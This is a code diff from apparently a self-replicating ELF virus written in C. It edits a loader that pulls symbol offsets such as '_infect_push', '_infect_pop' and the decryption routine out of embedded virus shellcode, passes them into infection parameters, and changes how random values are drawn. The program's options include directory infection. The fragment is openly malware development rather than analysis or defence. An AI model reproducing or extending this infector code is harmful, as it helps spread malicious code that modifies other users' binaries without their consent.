@@ -4,35 +4,6 @@
 #include "shellcode.h"
 #include "table.h"
 
-void _infect_push(void)
-{
-}
-void _infect_pop(void)
-{
-	asm("nop");
-	asm("nop");
-	asm("nop");
-	asm("nop");
-	asm("nop");
-	asm("nop");
-	asm("nop");
-	asm("nop");
-	asm("nop");
-	asm("nop");
-	asm("nop");
-	asm("nop");
-	asm("nop");
-	asm("nop");
-	asm("nop");
-	asm("nop");
-	asm("nop");
-	asm("nop");
-	asm("nop");
-	asm("nop");
-	asm("nop");
-	asm("nop");
-}
-
 char key[16];
 
 int usage(char *name){
@@ -42,20 +13,15 @@ int usage(char *name){
 	return -1;
 }
 
-int randomize(char k[16]){
+uint32_t ft_rand(){
+	uint32_t		rval;
 	int             fd;
 
 	if ((fd = ft_open("/dev/urandom", 0, 0)) == -1)
 		return FALSE;
-	ft_read(fd, (char *)k, sizeof(16));
+	ft_read(fd, &rval, 4);
 	ft_close(fd);
-	return TRUE;
-}
-
-uint32_t ft_rand(){
-	char k[16];
-	randomize(k);
-	return ((uint32_t*)k)[0];
+	return rval;
 }
 
 int get_virus_info(InfectParams *p){
@@ -97,9 +63,17 @@ int get_virus_info(InfectParams *p){
 	elf_off_symbol(virus_shellcode, virus_shellcode_len, "dataearly", (int64_t*)&dataearly_off);
 	dataearly_off -= bin_start_off; 
 	
+	int64_t infectpush_off;
+	elf_off_symbol(virus_shellcode, virus_shellcode_len, "_infect_push", (int64_t*)&infectpush_off);
+	infectpush_off -= bin_start_off;
+	
+	int64_t infectpop_off;
+	elf_off_symbol(virus_shellcode, virus_shellcode_len, "_infect_pop", (int64_t*)&infectpop_off);
+	infectpop_off -= bin_start_off;
+	
 	void *x = ft_malloc(1024);
 	((int*)x)[0] = 0;
-	*p = (InfectParams){v, l, cmpr_off, cmpr_len, c_off, c_len, decrypt_routine_off, x, data_off, dataearly_off};
+	*p = (InfectParams){v, l, cmpr_off, cmpr_len, c_off, c_len, decrypt_routine_off, x, data_off, dataearly_off, infectpush_off, infectpop_off};
 	return TRUE;
 }
 
@@ -161,7 +135,6 @@ int main(int ac, char **av){
 		return 2;
 	if (get_virus_info(&p) == FALSE)
 		return 1;
-	randomize(key);
 	for (int i = 1; i < ac; i ++){
 		if (str_equal(av[i], "--no-infect-dir"))
 			do_infect_dir = FALSE;
